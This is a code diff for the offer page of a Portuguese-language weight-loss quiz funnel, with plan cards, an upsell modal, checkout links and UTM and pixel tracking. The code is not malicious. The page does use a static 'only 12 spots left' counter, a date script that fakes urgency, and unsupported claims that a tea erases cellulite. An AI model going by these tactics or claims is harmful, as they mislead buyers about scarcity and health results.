+    font-weight: 600;
+    color: #ff5a00;
+
+    text-align: center;
+    margin-bottom: 10px;
+}
+
+.vagas-oferta strong {
+    font-weight: 700;
+}
+</style>
+
+<script>
+(function () {
+    const elemento = document.getElementById("data-desconto");
+    if (!elemento) return;
+
+    const hoje = new Date();
+
+    elemento.textContent = hoje.toLocaleDateString("pt-BR", {
+        day: "2-digit",
+        month: "2-digit",
+        year: "numeric"
+    });
+})();
+</script>
+            
+            <div class="installments">Pagamento único • Acesso ao plano escolhido</div>
+            <div class="s35-offer-guarantee">
+                🔒 Compra 100% Segura • 30 Dias de <br>Garantia Incondicional
+            </div>
+        </div>
+
+        <!-- CTA 2 -->
+<div class="offer-btn-wrap">
+    <a href="#s35-plans" class="offer-btn" data-offer-plans>ESCOLHER MEU PLANO</a>
+</div>
+
+        <!-- DEPOIMENTOS -->
+        <h3 class="section-title">Resultados que nos deixam orgulhosas</h3>
+        <img src="https://i.imgur.com/UJmdMt4.png" class="proof-img" alt="Resultado 1">
+        <img src="https://i.imgur.com/VgwfDUJ.png" class="proof-img" alt="Resultado 2">
+        <img src="https://i.imgur.com/4umDJF6.png" class="proof-img" alt="Resultado 3">
+        <img src="https://i.imgur.com/3XaZuu9.png" class="proof-img" alt="Resultado 4">
+
+                 <!-- Oferta -->
+        <div class="offer-box s35-offer-box">
+
+<div class="vagas-oferta">
+    🔥 Restam apenas <strong class="vagas-espelho">12</strong> vagas
+</div>
+
+
+
+            <div class="s35-offer-badge">Acesso imediato após o pagamento!</div>
+            <h3>Escolha seu plano</h3>
+            <p class="step-text">Básico por R$ 17,00 ou Premium por R$ 37,00</p>
+
+
+
+
+
+
+            
+            <div class="installments">Pagamento único • Acesso ao plano escolhido</div>
+            <div class="s35-offer-guarantee">
+                🔒 Compra 100% Segura • 30 Dias de <br>Garantia Incondicional
+            </div>
+        </div>
+
+        <!-- CTA 3 -->
+<div class="offer-btn-wrap">
+    <a href="#s35-plans" class="offer-btn" data-offer-plans>ESCOLHER MEU PLANO</a>
+</div>
+        <!-- BÔNUS -->
+        <h3 class="section-title s35-bonus-title">+Bônus Exclusivos do Premium</h3>
+        <p class="s35-bonus-sub">
+            No Plano Premium, além de você ter acesso às aulas e ao seu plano personalizado, separamos diversos bônus para te ajudar a acelerar o seu processo de emagrecimento rápido:
+        </p>
+
+        <div class="s35-bonus-card">
+            <div class="s35-bonus-icon">📖</div>
+            <div class="s35-bonus-content">
+                <strong>1. Chá Asiático Anticelulite</strong> — Misture uma planta pouco conhecida com água morna para assistir às celulites sumindo dia após dia.
+            </div>
+        </div>
+
+        <div class="s35-bonus-card">
+            <div class="s35-bonus-icon">🎯</div>
+            <div class="s35-bonus-content">
+                <strong>2. Dieta 100% Personalizada</strong> — Você terá acesso a diversas receitas para preparar e ver a gordura indo embora muito mais rápido.
+            </div>
+        </div>
+
+        <div class="s35-bonus-card">
+            <div class="s35-bonus-icon">🥗</div>
+            <div class="s35-bonus-content">
+                <strong>3. Cronograma de Alimentação Inteligente</strong> — O passo a passo completo para manter seu metabolismo acelerado e sua reeducação alimentar.
+            </div>
+        </div>
+
+        <div class="s35-bonus-card">
+            <div class="s35-bonus-icon">💬</div>
+            <div class="s35-bonus-content">
+                <strong>4. Suporte 24h Todos os Dias</strong> — Nosso time estará pronto para te ajudar com qualquer dúvida, independente do horário.
+            </div>
+        </div>
+
+        <!-- GARANTIA -->
+        <div class="guarantee-box">
+            <img src="https://i.imgur.com/4ci4ABK.png" alt="Garantia 30 dias">
+            <h3>30 Dias de Garantia Incondicional</h3>
+            <p>
+                Nós confiamos tanto nos resultados do Protocolo de Calistenia Coreana que o risco é todo nosso.<br><br>
+                Você tem 30 dias inteiros para testar o aplicativo e todos os bônus. Se por qualquer motivo você não estiver 100% satisfeita, nós devolveremos todo o seu investimento.
+                <br> <br><b>Reembolso total e imediato, sem perguntas <br>e sem complicações.</b>
+            </p>
+        </div>
+
+        <!-- FAQ -->
+        <h3 class="section-title s35-faq-title">Perguntas Frequentes</h3>
+        <div class="s35-faq">
+            <details class="s35-faq-item">
+                <summary>Quais são as Calistenias Coreanas?</summary>
+                <p>São movimentos de calistenia inspirados em técnicas coreanas, sem impacto, que ativam as fibras profundas do corpo e aceleram a queima de gordura em qualquer idade.</p>
+            </details>
+            <details class="s35-faq-item">
+                <summary>Preciso ter experiência com exercícios?</summary>
+                <p>Não. O protocolo foi desenhado para iniciantes e progride no seu ritmo, com vídeos curtos e explicativos passo a passo.</p>
+            </details>
+            <details class="s35-faq-item">
+                <summary>Em quanto tempo verei resultados?</summary>
+                <p>A maioria das alunas relata mudanças visíveis em até 21 dias seguindo o cronograma metabólico e a alimentação estratégica.</p>
+            </details>
+            <details class="s35-faq-item">
+                <summary>Como funciona o acesso após a compra?</summary>
+                <p>O acesso é liberado imediatamente após a confirmação do pagamento, direto no seu e-mail e dentro do nosso aplicativo.</p>
+            </details>
+            <details class="s35-faq-item">
+                <summary>E se eu não gostar?</summary>
+                <p>Você tem 30 dias de garantia total. Basta enviar um e-mail e devolvemos 100% do seu investimento, sem perguntas.</p>
+            </details>
+        </div>
+
+        <!-- CTA FINAL -->
+<div class="offer-btn-wrap">
+    <a href="#s35-plans" class="offer-btn" data-offer-plans>ESCOLHER MEU PLANO</a>
+</div>
+
+    </div><!-- /s35-offer-block -->
+
+</div><!-- /step-35 -->
+
+<style>
+/* ========== ETAPA 35 ========== */
+
+.offer-btn-wrap{margin:22px auto;max-width:420px;}
+.s35-cta{
+    width:100%;
+    background:#5b6bd6;
+    color:#fff;
+    border:none;
+    border-radius:14px;
+    padding:18px 16px;
+    font-size:15px;
+    font-weight:700;
+    cursor:pointer;
+    box-shadow:0 8px 20px rgba(91,107,214,.3);
+}
+.s35-cta:hover{filter:brightness(1.05);}
+
+.benefits-list{max-width:420px;margin:0 auto;}
+.benefit-item{
+    background:#f7f7f7;
+    padding:14px 16px;
+    border-radius:12px;
+    margin-bottom:10px;
+    font-size:14px;
+    line-height:1.45;
+    color:#333;
+}
+
+.s35-app-mockup{max-width:420px;margin:24px auto 0;text-align:center;}
+.s35-app-mockup img{width:100%;height:auto;border-radius:16px;}
+
+.offer-box{
+    background:#fff;
+    border:2px solid #5b6bd6;
+    border-radius:20px;
+    padding:25px;
+    text-align:center;
+    margin:25px auto 0;
+    max-width:420px;
+}
+.s35-offer-badge{
+    display:inline-block;
+    background:#5b6bd6;
+    color:#fff;
+    font-size:13px;
+    font-weight:600;
+    padding:6px 14px;
+    border-radius:999px;
+    margin-bottom:12px;
+}
+.old-price{text-decoration:line-through;color:#999;font-size:18px;}
+.new-price{font-size:56px;font-weight:700;color:#5b6bd6;line-height:1;margin-top:4px;}
+.installments{margin-top:8px;color:#666;font-size:14px;}
+.s35-offer-guarantee{
+    margin-top:10px;
+    font-size:13px;
+    color:#444;
+}
+
+.section-title{
+    text-align:center;
+    font-size:18px;
+    font-weight:700;
+    color:#222;
+    margin:30px auto 14px;
+    max-width:420px;
+}
+.proof-img{
+    width:100%;
+    max-width:420px;
+    display:block;
+    margin:14px auto 0;
+    border-radius:16px;
+}
+
+.s35-bonus-title{color:#5b6bd6;}
+.s35-bonus-sub{
+    max-width:420px;margin:0 auto 14px;
+    text-align:center;font-size:14px;color:#555;line-height:1.45;
+}
+.s35-bonus-card{
+    display:flex;gap:12px;
+    background:#fff;
+    border:1px solid #f0d6e0;
+    border-radius:14px;
+    padding:14px 16px;
+    margin:10px auto;
+    max-width:420px;
+    box-shadow:0 4px 12px rgba(0,0,0,.04);
+}
+.s35-bonus-icon{font-size:22px;line-height:1;}
+.s35-bonus-content{font-size:14px;line-height:1.45;color:#333;}
+.s35-bonus-content strong{color:#5b6bd6;}
+
+.guarantee-box{
+    text-align:center;
+    padding:25px;
+    background:#fff;
+    border-radius:20px;
+    margin:30px auto 0;
+    max-width:420px;
+    border:1px solid #eee;
+}
+.guarantee-box img{width:90px;height:auto;display:block;margin:0 auto 15px;}
+.guarantee-box h3{color:#5b6bd6;margin:0 0 10px;}
+.guarantee-box p{font-size:14px;color:#444;line-height:1.5;}
+
+.s35-faq{max-width:420px;margin:0 auto;}
+.s35-faq-item{
+    background:#fff;
+    border:1px solid #eee;
+    border-radius:12px;
+    padding:14px 16px;
+    margin-bottom:10px;
+}
+.s35-faq-item summary{
+    cursor:pointer;
+    font-weight:600;
+    color:#222;
+    list-style:none;
+    position:relative;
+    padding-right:24px;
+    font-size:14px;
+}
+.s35-faq-item summary::-webkit-details-marker{display:none;}
+.s35-faq-item summary::after{
+    content:"+";
+    position:absolute;right:0;top:50%;
+    transform:translateY(-50%);
+    color:#5b6bd6;font-weight:700;font-size:20px;
+}
+.s35-faq-item[open] summary::after{content:"−";}
+.s35-faq-item p{margin:10px 0 0;font-size:13.5px;color:#555;line-height:1.5;}
+
+.vsl-container{
+    width:100%;
+    max-width:420px;
+    margin:20px auto;
+    border-radius:28px;
+    overflow:hidden;
+    background:#000;
+    box-shadow:0 10px 30px rgba(0,0,0,.15);
+    position:relative;
+}
+.vsl-container iframe,
+.vsl-container video,
+.vsl-container vturb-smartplayer{
+    border-radius:28px !important;
+    display:block;
+    width:100%;
+}
+</style>
+
+<script>
+/* =========================================================
+   LÓGICA DA ETAPA 35
+   FLUXO:
+   1) Usuário chega na etapa 35 -> carrega o player VSL (VTURB).
+   2) Depois de 5min20s (320s) -> aparece o bloco de oferta
+      (CTA, benefícios, bônus, garantia, FAQ etc.).
+========================================================= */
+(function () {
+    var step35 = document.getElementById('step-35');
+    if (!step35) return;
+
+    // ====== CONFIGURAÇÃO DE TEMPO ======
+    var MODO_PREVIEW    = true;                // true = libera oferta na hora | false = espera 5min20s
+    var DELAY_OFERTA_MS = (5 * 60 + 20) * 1000; // 5min20s
+    // ===================================
+
+    var offerBlock = document.getElementById('s35-offer-block');
+
+    var offerShown    = false;
+    var vslLoaded     = false;
+    var offerTimerId  = null;
+
+    function loadVSL() {
+        if (vslLoaded) return;
+        vslLoaded = true;
+        var s = document.createElement("script");
+        s.src = "https://scripts.converteai.net/ae70a9b6-340f-4796-87f3-1ea3613249f5/players/6aaf3134d4183d52da4067e5/v4/player.js";
+        s.async = true;
+        document.head.appendChild(s);
+    }
+
+    function showOffer() {
+        if (offerShown) return;
+        offerShown = true;
+        if (offerBlock) offerBlock.style.display = 'block';
+    }
+
+    function onStep35Visible() {
+        loadVSL();
+        if (MODO_PREVIEW) {
+            showOffer();
+        } else if (offerTimerId === null) {
+            offerTimerId = setTimeout(showOffer, DELAY_OFERTA_MS);
+        }
+    }
+
+    function isVisible(el){ return el && el.offsetParent !== null; }
+
+    var triggered = false;
+    function maybeTrigger(){
+        if (triggered) return;
+        if (isVisible(step35)) {
+            triggered = true;
+            onStep35Visible();
+        }
+    }
+
+    maybeTrigger();
+    var mo = new MutationObserver(maybeTrigger);
+    mo.observe(step35, { attributes: true, attributeFilter: ['class','style'] });
+    document.addEventListener('click', function(){ setTimeout(maybeTrigger, 50); }, true);
+})();
+</script>
+    </main>
+
+<!-- Oferta especial: visível apenas ao escolher o Básico -->
+<dialog id="s35-premium-modal" aria-labelledby="s35-modal-title" aria-describedby="s35-modal-description">
+    <button type="button" class="s35-modal-close" aria-label="Fechar oferta especial">×</button>
+    <div class="s35-modal-gift" aria-hidden="true">🎁</div>
+    <h2 id="s35-modal-title">Espere! Oferta especial</h2>
+    <p id="s35-modal-description">Antes de continuar com o Básico, desbloqueie o Premium completo por apenas +R$ 10.</p>
+    <div class="old-price">De R$ 37,00</div>
+    <div class="new-price">R$ 27,00</div>
+    <p class="installments">Pagamento único</p>
+    <ul class="s35-plan-features">
+    <li>Protocolo Cintura K</li>
+    <li>Glúteo K-Shape</li>
+    <li>K-Food 21</li>
+    <li>Método Zero Impacto</li>
+    <li>Diário de Transformação</li>
+    <li>Todos os bônus Premium</li>
+    <li>Acesso vitalício</li>
+</ul>
+    <a class="offer-btn" data-offer-checkout="premium27">🔥 QUERO O PREMIUM POR R$ 27</a>
+    <a class="s35-modal-decline" data-offer-checkout="basico17">Não, quero continuar somente com o Básico por R$ 17</a>
+</dialog>
+<style>
+#s35-plans { display: grid; grid-template-columns: minmax(0, 1fr); gap: 24px; margin: 24px 0; scroll-margin-top: 90px; }
+.s35-plan { position: relative; min-width: 0; padding: 24px 16px; border: 1px solid #dfe2e7; border-radius: 18px; background: #fff; text-align: center; }
+.s35-plan h3 { font-size: 21px; }
+.s35-plan .new-price { font-size: clamp(32px, 10vw, 42px); white-space: nowrap; }
+.s35-plan-premium { border: 2px solid #5b6bd6; box-shadow: 0 8px 26px rgba(91,107,214,.2); padding-top: 32px; }
+.s35-plan-badge { position: absolute; top: -14px; left: 50%; transform: translateX(-50%); padding: 5px 16px; border-radius: 20px; background: #5b6bd6; color: #fff; font-size: 11px; font-weight: 700; white-space: nowrap; }
+.s35-plan-features { list-style: none; text-align: left; margin: 20px 0; padding: 0; font-size: 13px; line-height: 1.6; }
+.s35-plan-features li { display: flex; gap: 8px; margin: 8px 0; }
+.s35-plan-features li::before { content: '✓'; color: #5b6bd6; font-weight: 700; flex-shrink: 0; }
+.s35-plan .offer-btn, #s35-premium-modal .offer-btn { font-size: 14px; padding: 16px 12px; cursor: pointer; }
+.s35-plan .s35-basic-btn { background: #fff; color: #5b6bd6 !important; border: 1px solid #5b6bd6; box-shadow: none; }
+#s35-premium-modal { position: fixed; inset: 0; width: calc(100% - 24px); max-width: 420px; max-height: calc(100vh - 24px); max-height: calc(100dvh - 24px); margin: auto; padding: 36px 22px 24px; border: 0; border-radius: 22px; overflow-y: auto; overscroll-behavior: contain; background: #fff; color: #1a1a1a; text-align: center; box-shadow: 0 24px 80px rgba(0,0,0,.3); }
+#s35-premium-modal::backdrop { background: rgba(15,18,38,.7); }
+#s35-premium-modal h2 { font-size: 23px; margin-bottom: 12px; line-height: 1.25; }
+#s35-modal-description { font-size: 14px; line-height: 1.6; margin-bottom: 18px; }
+.s35-modal-gift { font-size: 36px; margin-bottom: 8px; }
+.s35-modal-close { position: absolute; top: 8px; right: 8px; width: 36px; height: 36px; border: 0; border-radius: 50%; background: #f3f4f8; color: #495057; font-size: 26px; cursor: pointer; }
+.s35-modal-decline { display: block; margin-top: 18px; color: #6c757d; font-size: 12px; line-height: 1.6; text-decoration: underline; }
+#s35-premium-modal :focus-visible, #s35-plans :focus-visible { outline: 3px solid #5b6bd6; outline-offset: 3px; }
+</style>
+
+    <!-- Footer do Quiz -->
+    <footer class="quiz-footer text-center">
+        <p>© 2026 Calistenia Coreana. Todos os direitos reservados.</p>
+        <p>Termos de Uso | Políticas de Privacidade</p>
+    </footer>
+    <!-- Scripts de Lógica -->
+    <script>
+/**
+ * LÓGICA DO QUIZ - PROGRAMA DE CALISTENIA ASIÁTICA
+ */
+
+// ESTADO GLOBAL DO QUIZ
+const quizState = {
+    currentStep: 1,
+    history: [],
+    answers: {},
+    
+    // Unidades de Medida Atuais
+    heightUnit: 'cm', // 'cm' ou 'pol'
+    weightUnit: 'kg', // 'kg' ou 'lb'
+    targetWeightUnit: 'kg',
+    
+    // Valores numéricos padrão (em métrico)
+    heightCm: 165,
+    weightKg: 73,
+    targetWeightKg: 57,
+    age: 0,
+    
+    // Parâmetros de UTM capturados
+    utms: {}
+};
+
+/* ==========================================
+   0. PERSISTÊNCIA EM LOCALSTORAGE
+   (mantém a etapa e as respostas ao atualizar a página)
+   ========================================== */
+const QUIZ_STORAGE_KEY = "quiz_calistenia_state";
+
+function saveQuizStateToStorage() {
+    try {
+        const stateToSave = {
+            currentStep: quizState.currentStep,
+            history: quizState.history,
+            answers: quizState.answers,
+            heightUnit: quizState.heightUnit,
+            weightUnit: quizState.weightUnit,
+            targetWeightUnit: quizState.targetWeightUnit,
+            heightCm: quizState.heightCm,
+            weightKg: quizState.weightKg,
+            targetWeightKg: quizState.targetWeightKg,
+            age: quizState.age
+        };
+        localStorage.setItem(QUIZ_STORAGE_KEY, JSON.stringify(stateToSave));
+    } catch (e) {
+        console.error("Erro ao salvar o progresso do quiz no localStorage", e);
+    }
+}
+
+function loadQuizStateFromStorage() {
+    try {
+        const stored = localStorage.getItem(QUIZ_STORAGE_KEY);
+        if (!stored) return null;
+        return JSON.parse(stored);
+    } catch (e) {
+        console.error("Erro ao carregar o progresso do quiz do localStorage", e);
+        return null;
+    }
+}
+
+// Restaura o estado salvo: valores numéricos, respostas marcadas visualmente e a etapa atual
+function restoreQuizState(saved) {
+    if (!saved || !saved.currentStep || saved.currentStep < 1) return;
+
+    quizState.answers = saved.answers || {};
+    quizState.history = Array.isArray(saved.history) ? saved.history : [];
+    quizState.heightUnit = saved.heightUnit || quizState.heightUnit;
+    quizState.weightUnit = saved.weightUnit || quizState.weightUnit;
+    quizState.targetWeightUnit = saved.targetWeightUnit || quizState.targetWeightUnit;
+    quizState.heightCm = saved.heightCm || quizState.heightCm;
+    quizState.weightKg = saved.weightKg || quizState.weightKg;
+    quizState.targetWeightKg = saved.targetWeightKg || quizState.targetWeightKg;
+    quizState.age = saved.age || quizState.age;
+
+    restoreAnswersUI();
+    restoreUnitToggles();
+
+    // Vai direto para a etapa salva, sem empilhar uma nova entrada no histórico
+    showStep(saved.currentStep, false);
+}
+
+// Re-marca visualmente as respostas já dadas em cada etapa (botões selecionados, checkboxes, idade)
+function restoreAnswersUI() {
+    Object.keys(quizState.answers).forEach(key => {
+        const match = key.match(/^step-(\d+)$/);
+        if (!match) return;
+
+        const stepId = match[1];
+        const stepCard = document.getElementById(`step-${stepId}`);
+        if (!stepCard) return;
+
+        const value = quizState.answers[key];
+
+        if (Array.isArray(value)) {
+            // Etapa de múltipla seleção
+            const checkboxEls = stepCard.querySelectorAll(".option-checkbox, .option-checkbox-img, .option-checkbox-img-row, .option-checkbox-row");
+            checkboxEls.forEach(el => {
+                if (value.includes(el.getAttribute("data-value"))) {
+                    el.classList.add("selected");
+                }
+            });
+            updateMultiSelectButtonState(stepCard);
+
+            // Sincroniza o switch "corpo inteiro" da etapa 7
+            if (stepId === "7") {
+                const fullBodyToggle = document.getElementById("toggle-full-body");
+                const allCbs = stepCard.querySelectorAll(".option-checkbox-img");
+                const allSelected = allCbs.length > 0 && Array.from(allCbs).every(cb => cb.classList.contains("selected"));
+                if (fullBodyToggle) fullBodyToggle.checked = allSelected;
+            }
+        } else {
+            // Etapa de seleção única
+            const btnEls = stepCard.querySelectorAll(".option-btn, .option-btn-icon, .option-grid-btn, .option-row-img-btn, .option-btn-emoji, .option-btn-icon-row, .option-grid-text-btn");
+            btnEls.forEach(btn => {
+                if (btn.getAttribute("data-value") === value) {
+                    btn.classList.add("active-selected");
+                }
+            });
+        }
+    });
+
+    // Restaura campo de idade (etapa 19)
+    if (quizState.age) {
+        const ageInput = document.getElementById("input-age");
+        const nextAgeBtn = document.getElementById("btn-next-age");
+        if (ageInput) ageInput.value = quizState.age;
+        if (nextAgeBtn) nextAgeBtn.removeAttribute("disabled");
+    }
+}
+
+// Restaura as unidades de medida escolhidas (cm/pol, kg/lb) e os valores exibidos nas réguas
+function restoreUnitToggles() {
+    // Altura
+    const heightDisplayVal = quizState.heightUnit === 'cm' ? quizState.heightCm : quizState.heightCm / 2.54;
+    const heightValueEl = document.getElementById("height-value");
+    if (heightValueEl) heightValueEl.textContent = Math.round(heightDisplayVal);
+    if (quizState.heightUnit !== 'cm') {
+        const heightCard = document.getElementById("step-16");
+        heightCard.querySelectorAll(".btn-unit").forEach(b => b.classList.toggle("active", b.getAttribute("data-unit") === quizState.heightUnit));
+        document.getElementById("height-unit").textContent = quizState.heightUnit;
+        setupRuler("height", RULER_CONFIGS.height[quizState.heightUnit], val => {
+            quizState.heightCm = val * 2.54;
+            document.getElementById("height-value").textContent = Math.round(val);
+        });
+    }
+
+    // Peso
+    const weightDisplayVal = quizState.weightUnit === 'kg' ? quizState.weightKg : quizState.weightKg / 0.45359237;
+    const weightValueEl = document.getElementById("weight-value");
+    if (weightValueEl) weightValueEl.textContent = Math.round(weightDisplayVal);
+    if (quizState.weightUnit !== 'kg') {
+        const weightCard = document.getElementById("step-17");
+        weightCard.querySelectorAll(".btn-unit").forEach(b => b.classList.toggle("active", b.getAttribute("data-unit") === quizState.weightUnit));
+        document.getElementById("weight-unit").textContent = "lb";
+        setupRuler("weight", RULER_CONFIGS.weight[quizState.weightUnit], val => {
+            quizState.weightKg = val * 0.45359237;
+            document.getElementById("weight-value").textContent = Math.round(val);
+            calculateBMI();
+        });
+    }
+
+    // Peso Alvo
+    const targetDisplayVal = quizState.targetWeightUnit === 'kg' ? quizState.targetWeightKg : quizState.targetWeightKg / 0.45359237;
+    const targetValueEl = document.getElementById("target-weight-value");
+    if (targetValueEl) targetValueEl.textContent = Math.round(targetDisplayVal);
+    if (quizState.targetWeightUnit !== 'kg') {
+        const targetCard = document.getElementById("step-18");
+        targetCard.querySelectorAll(".btn-unit").forEach(b => b.classList.toggle("active", b.getAttribute("data-unit") === quizState.targetWeightUnit));
+        document.getElementById("target-weight-unit").textContent = "lb";
+        setupRuler("target-weight", RULER_CONFIGS.targetWeight[quizState.targetWeightUnit], val => {
+            quizState.targetWeightKg = val * 0.45359237;
+            document.getElementById("target-weight-value").textContent = Math.round(val);
+        });
+    }
+
+    // Atualiza o feedback de IMC exibido na etapa 17 com os valores restaurados
+    calculateBMI();
+}
+
+// CONFIGURAÇÕES DAS RÉGUAS
+const RULER_CONFIGS = {
+    height: {
+        cm: { min: 100, max: 220, defaultValue: 165, step: 1, labelFreq: 10, pixelPerTick: 12 },
+        pol: { min: 40, max: 86, defaultValue: 65, step: 1, labelFreq: 5, pixelPerTick: 12 }
+    },
+    weight: {
+        kg: { min: 30, max: 180, defaultValue: 73, step: 1, labelFreq: 10, pixelPerTick: 12 },
+        lb: { min: 66, max: 400, defaultValue: 160, step: 1, labelFreq: 20, pixelPerTick: 12 }
+    },
+    targetWeight: {
+        kg: { min: 30, max: 180, defaultValue: 57, step: 1, labelFreq: 10, pixelPerTick: 12 },
+        lb: { min: 66, max: 400, defaultValue: 125, step: 1, labelFreq: 20, pixelPerTick: 12 }
+    }
+};
+
+// INICIALIZAÇÃO NO CARREGAMENTO
+document.addEventListener("DOMContentLoaded", () => {
+    captureUTMs();
+    applyUTMsToCTA();
+    initSteps();
+    initRulers();
+    initTracking();
+    initVSLPlayer();
+
+    // Restaura o progresso salvo (se existir) para manter a etapa e as respostas ao atualizar a página
+    const savedQuizState = loadQuizStateFromStorage();
+    if (savedQuizState) {
+        restoreQuizState(savedQuizState);
+    }
+});
+
+/* ==========================================
+   1. CAPTURA E GERENCIAMENTO DE UTMs
+   ========================================== */
+function captureUTMs() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'src', 'xcod', 'utmify'];
+    
+    // Tenta capturar da URL
+    utmKeys.forEach(key => {
+        const value = urlParams.get(key);
+        if (value) {
+            quizState.utms[key] = value;
+        }
+    });
+
+    // Se não achou na URL, tenta recuperar do sessionStorage
+    if (Object.keys(quizState.utms).length === 0) {
+        const stored = sessionStorage.getItem('quiz_utms');
+        if (stored) {
+            try {
+                quizState.utms = JSON.parse(stored);
+            } catch (e) {
+                console.error("Erro ao ler UTMs do cache", e);
+            }
+        }
+    } else {
+        // Salva no sessionStorage para persistência
+        sessionStorage.setItem('quiz_utms', JSON.stringify(quizState.utms));
+    }
+    
+    console.log("UTMs capturadas:", quizState.utms);
+}
+
+// Retorna uma string formatada com os parâmetros UTM
+function getUTMQueryString() {
+    if (Object.keys(quizState.utms).length === 0) return "";
+    const params = new URLSearchParams();
+    for (const [key, val] of Object.entries(quizState.utms)) {
+        params.append(key, val);
+    }
+    return "?" + params.toString();
+}
+
+// LÓGICA DA OFERTA: configure os três checkouts somente aqui.
+const CHECKOUT_BASICO_17 = "https://pay.cakto.com.br/3e5rvxq";
+const CHECKOUT_PREMIUM_27 = "https://pay.cakto.com.br/kzbj37f";
+const CHECKOUT_PREMIUM_37 = "https://pay.cakto.com.br/tkzxebt_1122897";
+
+const offerCheckouts = {
+    basico17: { url: CHECKOUT_BASICO_17, value: 17.00 },
+    premium27: { url: CHECKOUT_PREMIUM_27, value: 27.00 },
+    premium37: { url: CHECKOUT_PREMIUM_37, value: 37.00 }
+};
+
+function getOfferCheckoutURL(key) {
+    const checkout = offerCheckouts[key];
+    if (!checkout || checkout.url === 'COLOCAR_LINK_AQUI') return null;
+    try {
+        const url = new URL(checkout.url);
+        if (!['https:', 'http:'].includes(url.protocol)) return null;
+        // Mantém parâmetros do checkout e acrescenta as UTMs capturadas pelo quiz.
+        for (const [name, value] of Object.entries(quizState.utms)) {
+            url.searchParams.set(name, value);
+        }
+        return url.href;
+    } catch (error) {
+        return null;
+    }
+}
+
+function applyUTMsToCTA() {
+    document.querySelectorAll('[data-offer-checkout]').forEach(link => {
+        link.setAttribute('href', getOfferCheckoutURL(link.dataset.offerCheckout) || '#');
+    });
+}
+
+(function initOffer() {
+    const modal = document.getElementById('s35-premium-modal');
+    const openButton = document.getElementById('s35-basic-open');
+    let scrollPosition = 0;
+    let savedBodyStyles = null;
+
+    openButton.addEventListener('click', () => {
+        if (modal.open) return;
+        scrollPosition = window.scrollY;
+        savedBodyStyles = document.body.getAttribute('style');
+        Object.assign(document.body.style, {
+            overflow: 'hidden', position: 'fixed', top: '-' + scrollPosition + 'px', width: '100%'
+        });
+        modal.showModal();
+        modal.scrollTop = 0;
+        modal.querySelector('.s35-modal-close').focus({ preventScroll: true });
+    });
+
+    modal.querySelector('.s35-modal-close').addEventListener('click', () => modal.close());
+    // O evento close também restaura a página ao fechar com Escape.
+    modal.addEventListener('close', () => {
+        if (savedBodyStyles === null) document.body.removeAttribute('style');
+        else document.body.setAttribute('style', savedBodyStyles);
+        window.scrollTo(0, scrollPosition);
+        openButton.focus({ preventScroll: true });
+    });
+
+    document.querySelectorAll('[data-offer-plans]').forEach(link => {
+        link.addEventListener('click', event => {
+            event.preventDefault();
+            const plans = document.getElementById('s35-plans');
+            plans.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            plans.focus({ preventScroll: true });
+        });
+    });
+
+    document.querySelectorAll('[data-offer-checkout]').forEach(link => {
+        link.addEventListener('click', event => {
+            const key = link.dataset.offerCheckout;
+            const url = getOfferCheckoutURL(key);
+            if (!url) {
+                event.preventDefault();
+                alert('O checkout deste plano ainda não foi configurado.');
+                return;
+            }
+            // O href já contém as UTMs; mantém também parâmetros extras de rastreadores.
+            if (link.getAttribute('href') === '#') link.setAttribute('href', url);
+            if (typeof fbq === 'function') {
+                try {
+                    fbq('track', 'InitiateCheckout', {
+                        value: offerCheckouts[key].value,
+                        currency: 'BRL'
+                    });
+                } catch (error) {
+                    console.warn('Não foi possível registrar InitiateCheckout.', error);
+                }
+            }
+        });
+    });
+})();
+
+/* ==========================================
+   2. GERENCIAMENTO DE PASSOS DO QUIZ (SPA)
+   ========================================== */
+function initSteps() {
+    const wrapper = document.getElementById("steps-wrapper");
+    const backBtn = document.getElementById("btn-back");
+
+    // Configurar cliques nos botões de opções de seleção única
+    wrapper.addEventListener("click", (e) => {
+        // Seleção de Botão Padrão ou Emoji / Grade
+        const targetBtn = e.target.closest(".option-btn, .option-btn-icon, .option-grid-btn, .option-row-img-btn, .option-btn-emoji, .option-btn-icon-row, .option-grid-text-btn");
+        
+        if (targetBtn) {
+            const stepCard = targetBtn.closest(".step-card");
+            const stepId = parseInt(stepCard.id.split("-")[1]);
+            const val = targetBtn.getAttribute("data-value");
+            
+            // Registra resposta no estado
+            quizState.answers[`step-${stepId}`] = val;
+            saveQuizStateToStorage();
+            
+            // Efeito de seleção ativo visual temporário
+            stepCard.querySelectorAll(".option-btn, .option-btn-icon, .option-grid-btn, .option-row-img-btn, .option-btn-emoji, .option-btn-icon-row, .option-grid-text-btn").forEach(b => b.classList.remove("active-selected"));
+            targetBtn.classList.add("active-selected");
+
+            // Condicional de fluxo para Etapa 14 -> Se confortável, pula etapa 15
+            if (stepId === 14) {
+                if (val === "Confortável") {
+                    setTimeout(() => navigateTo(16), 250); // Pula a 15
+                    return;
+                }
+            }
+
+            setTimeout(() => navigateTo(stepId + 1), 250);
+        }
+
+        // Multi-seleção (Toggles/Checkboxes)
+        const targetCheckbox = e.target.closest(".option-checkbox, .option-checkbox-img, .option-checkbox-img-row, .option-checkbox-row");
+        if (targetCheckbox) {
+            const stepCard = targetCheckbox.closest(".step-card");
+            const stepId = parseInt(stepCard.id.split("-")[1]);
+            
+            // Se for a opção especial "Nenhuma das opções acima" (Step 13)
+            if (targetCheckbox.classList.contains("special-none-option")) {
+                const isSelectedNow = !targetCheckbox.classList.contains("selected");
+                stepCard.querySelectorAll(".option-checkbox-img-row").forEach(cb => {
+                    cb.classList.remove("selected");
+                });
+                if (isSelectedNow) {
+                    targetCheckbox.classList.add("selected");
+                }
+            } else {
+                // Remove seleção do "Nenhuma das opções" se selecionar outra coisa
+                const noneOption = stepCard.querySelector(".special-none-option");
+                if (noneOption) noneOption.classList.remove("selected");
+                
+                targetCheckbox.classList.toggle("selected");
+            }
+            
+            updateMultiSelectButtonState(stepCard);
+        }
+    });
+
+    // Botões de avançar em telas de informações
+    document.querySelectorAll(".btn-next").forEach(btn => {
+        btn.addEventListener("click", () => {
+            const stepCard = btn.closest(".step-card");
+            const stepId = parseInt(stepCard.id.split("-")[1]);
+            
+            // Trata redirecionamento na etapa final 34
+            if (stepId === 34) {
+                navigateTo(35);
+                return;
+            }
+            
+            navigateTo(stepId + 1);
+        });
+    });
+
+    // Botões de avançar em telas de multi-seleção
+    document.querySelectorAll(".btn-next-multi").forEach(btn => {
+        btn.addEventListener("click", () => {
+            const stepCard = btn.closest(".step-card");
